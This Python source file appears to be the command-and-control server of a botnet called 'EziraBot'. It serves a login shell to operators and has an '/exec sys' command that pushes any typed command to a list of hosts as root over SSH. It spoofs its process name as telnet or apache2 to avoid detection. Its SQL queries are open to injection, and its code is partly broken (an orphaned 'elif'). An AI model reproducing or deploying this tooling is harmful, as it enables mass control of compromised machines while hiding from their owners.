#!/usr/bin/python
# -*- coding: utf-8 -*-

# Misc Libs
import time
import random
from datetime import datetime

# Character Libs
import string
import hashlib
import binascii

# System Libs
import os
import sys
import itertools
import subprocess
import ctypes
import threading

# Network Libs
from pssh.pssh2_client import ParallelSSHClient
import socket
import MySQLdb
import requests


class puts:

    @staticmethod
    def run(cmd):
        subprocess.call(cmd, shell=True)

    @staticmethod
    def err(string):
        sys.stderr.write(string + "\n")

    @staticmethod
    def out(string):
        sys.stdout.write(string + "\n")

# Variables
max_threads = 50
states = ['telnet', 'ntpq', 'ntpdc', 'apache2']
thread_ids = []
syntax_prefix = "/"
tcp_allow = True
__tcpname__ = "\033[46m\033[30m[ezira_tcp]\033[0m"
__obfname__ = "\033[101m\033[30m[ezira_obf]\033[0m"
__cltname__ = "\033[45m\033[30m[ezira_client]\033[0m"
__sysname__ = "\033[100m\033[30m[ezira_sys]\033[0m"
__tskname__ = "\033[104m\033[30m[ezira_task]\033[0m"


def check_for_package():
    global states

    select_pack = (random.choice(states))
    result = os.path.isfile("/usr/bin/%s" % (select_pack))
    if (result):
        puts.out(__obfname__ + " package: %s found. using as spoofed process name." % (select_pack))

        processname = select_pack

        libc = ctypes.cdll.LoadLibrary('libc.so.6')
        libc.prctl(15, processname, 0, 0, 0)

        Server()

    elif (not result):
        puts.out(__obfname__ + " package: %s is not installed. attempting new package." % (select_pack))
        check_for_package()


def GetClientThread():
    char = ''.join(random.choice(string.digits) for x in range(6))
    fin_char = "0x" + char
    return fin_char


def GetBanner(conn):
    clist = ["\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m"]
    is_banner_a_file = os.path.isfile("/var/log/ezira/banner.txt")

    if (is_banner_a_file == True):
        file = open("/var/log/ezira/banner.txt")

        for line in file:
            dcol = random.choice(clist)
            line = line.strip("\r\n")
            conn.send(dcol + line + "\r\n")

    elif (is_banner_a_file == False):
        pass


def client(gct, conn, addr):
    conn.send("\033]0;EziraBot\007")
    global thread_ids
    global usernames_active
    global devices_av
    global install
    admin = False
    banned = False
    premium = False
    isValidAccount = False
    isSession1 = False
    hosts = []
    db = MySQLdb.connect(host="localhost", user="root", passwd="", db="ezira")
    cur = db.cursor()
    try:
        file = open("/var/log/ezira/ssh_servers.txt", "r")
        for line in file:
            hosts.append(line.strip("\r\n"))

        conn.send("executing 'login' from task: mmaster_cnc_scmd\r\n")
        puts.out(__cltname__ + " prompting client with login")
        conn.send("\033[1m\033[30m\033[107mlogin:\033[0m ")
        username = conn.recv(1024).strip("\r\n")
        conn.send("\033[1m\033[30m\033[107mpassword:\033[0m ")
        password = conn.recv(1024).strip("\r\n")
        puts.out(__cltname__ + " client sent login [%s:%s]" % (username, password))

        cur.execute("SELECT * FROM `users` WHERE username=\"%s\" AND password=\"%s\"" % (username, password))
        row = cur.fetchall()
        if (row):
            isValidAccount = True

            if (row[0][3] == 1):
                admin = True
            if (row[0][4] == 1):
                banned = True
            if (row[0][5] == 1):
                premium = True
            if (row[0][6] == 1):
                isSession1 = True

        elif (not row):
            isValidAccount = False

        if (isValidAccount == True and banned == False and isSession1 == False):
            conn.send("\033]0;EziraBot | Username - %s | Administrator - %s | Conns - %s\007" % (username, admin, len(hosts)))
            cur.execute("UPDATE `users` SET session=1 WHERE username=\"%s\" AND password=\"%s\"" % (username, password))
            conn.send("\033[2J\033[1;1H")
            GetBanner(conn)

            try:
                while True:
                    conn.send("\033[0m%s@ezira $ " % (username))
                    try:
                        oCmd = conn.recv(512)
                        blank = conn.recv(512)

                        nCmd = oCmd.split(' ')

                        elif (nCmd[0] == syntax_prefix+"threads"):
                            conn.send("[%d/%d] threads used\r\n" % (len(thread_ids), max_threads))

                        elif (nCmd[0] == syntax_prefix+"logout"):
                            conn.close()
                            cur.execute("UPDATE `users` SET session=0 WHERE username=\"%s\" AND password=\"%s\"" % (username, password))

                        elif (nCmd[0] == syntax_prefix+"clear"):
                            conn.send("\033[2J\033[1;1H")

                        elif (nCmd[0] == syntax_prefix+"net_info"):
                            try:
                                if (nCmd[1] == "ip-domain"):
                                    host = nCmd[2]
                                    result = socket.gethostbyname(str(host))
                                    conn.send(result + "\r\n")

                                elif (nCmd[1] == "getfqdn"):
                                    host = nCmd[2]
                                    result = socket.getfqdn(str(host))
                                    conn.send(result + "\r\n")
                            except socket.gaierror as e:
                                conn.send(__tskname__ + " task '%s': failed to resolve hostname '%s'\r\n" % (nCmd[0],host))

                        elif (nCmd[0] == syntax_prefix+"adduser"):
                            if (admin):
                                cur.execute("INSERT INTO `users` VALUES (NULL, \"%s\", \"%s\", 0, 0, 0, 0)" % (nCmd[1], nCmd[2]))

                            elif (not admin):
                                conn.send(__tskname__ + " task '%s': failed to execute | user not administrator\r\n" % (nCmd[0]))

                        elif (nCmd[0] == syntax_prefix+"banuser"):
                            if (admin):
                                cur.execute("UPDATE `users` SET banned=1 WHERE username=\"%s\"" % (nCmd[1]))

                            elif (not admin):
                                conn.send(__tskname__ + " task '%s': failed to execute | user not administrator\r\n" % (nCmd[0]))

                        elif (nCmd[0] == syntax_prefix+"shutdown"):
                            if (admin):
                                sys.exit("[ezira_sys] shutting down... (0)")

                            elif (not  admin):
                                conn.send(__tskname__ + " task '%s': failed to execute | user not administrator\r\n" % (nCmd[0]))

                        elif (nCmd[0] == syntax_prefix+"exec"):

                            if (nCmd[1] == "sys"):
                                conn.send("command: ")
                                cmdInput = conn.recv(1024)
                                conn.send("executing 'sys' to hosts...\r\n")

                                ssh_h_client = ParallelSSHClient(hosts, user="root", password="SET_PASSWORD", port=22, timeout=10)
                                output = ssh_h_client.run_command(cmdInput)
                                for host in output:
                                    puts.out(__tskname__ + " task '%s': executed on %s | exit code: '%s'" % (nCmd[1], host, output[host].exit_code))

                        elif (nCmd[0] == syntax_prefix+"enable"):

                            if (nCmd[1] == "telnet"):

                                if (nCmd[2] == "honeypot"):
                                    pass

                            elif (nCmd[1] == "ssh"):

                                if (nCmd[2] == "honeypot"):
                                    pass

                    except Exception as e:
                        conn.send("Invalid Syntax\r\n")
                        puts.out(str(e))

            except Exception:
                puts.out(__cltname__ + " user {}:{} has disconnected with id {}".format(addr[0], addr[1], gct))
                cur.execute("UPDATE `users` SET session=0 WHERE username=\"%s\" AND password=\"%s\"" % (username, password))
                thread_ids.remove(gct)
                if (conn):
                    conn.close()

        elif (isValidAccount == False):
            puts.out(__cltname__ + " %s:%s tried logging in with a non-existant account %s:%s" % (addr[0], addr[1], username, password))
            thread_ids.remove(gct)
            raise Exception

        elif (isSession1 == True):
            puts.out(__cltname__ + " user has tried logging in twice, killing connection. [%s:%s - %s:%s]" % (addr[0], addr[1], username, password))
            thread_ids.remove(gct)
            raise Exception

        elif (isValidAccount == True and banned == True):
            puts.out(__cltname__ + " %s:%s tried logging into a banned account %s:%s" % (addr[0], addr[1], username, password))
            thread_ids.remove(gct)
            raise Exception

    except Exception as e:
        puts.out(__cltname__ + " user {}:{} has disconnected with id {}".format(addr[0], addr[1], gct))
        cur.execute("UPDATE `users` SET session=0 WHERE username=\"%s\" AND password=\"%s\"" % (username, password))
        try:
            thread_ids.remove(gct)
        except ValueError:
            pass

        if (conn):
            conn.close()


def Server():
    sock = socket.socket()

    try:
        sock.bind(("0.0.0.0", int(sys.argv[1])))
    except socket.error:
        puts.err(__tcpname__ + " address already in use")

    puts.out(__tcpname__ + " socket is now listening on %d" % (int(sys.argv[1])))
    sock.listen(0)
    puts.out("------------------------------------")

    try:
        if (tcp_allow):
            while True:
                conn, addr = sock.accept()
                puts.out(__tcpname__ + " new connection from {}:{}".format(addr[0], addr[1]))
                gct = GetClientThread()
                thread_ids.append(gct)
                puts.out(__tcpname__ + " client assigned thread {}".format(gct))
                try:
                    if (len(thread_ids) != max_threads):
                        gct_run = threading.Thread(target=client, args=(gct, conn, addr,)).start()
                    else:
                        puts.out(__tcpname__ + "max threads used. disconnecting client.")
                except threading.ThreadError:
                    puts.out(__tcpname__ + " failed to start thread with id {}".format(gct))

                except:
                    puts.out(__tcpname__ + " unknown thread error returning id {}".format(gct))

        elif (not  tcp_allow):
            sys.exit(__tcpname__ + " tcp_allow var set to False")

    except socket.error as e:
        puts.out(__tcpname__ + " unexpected error.")
        puts.out(str(e))

Server()
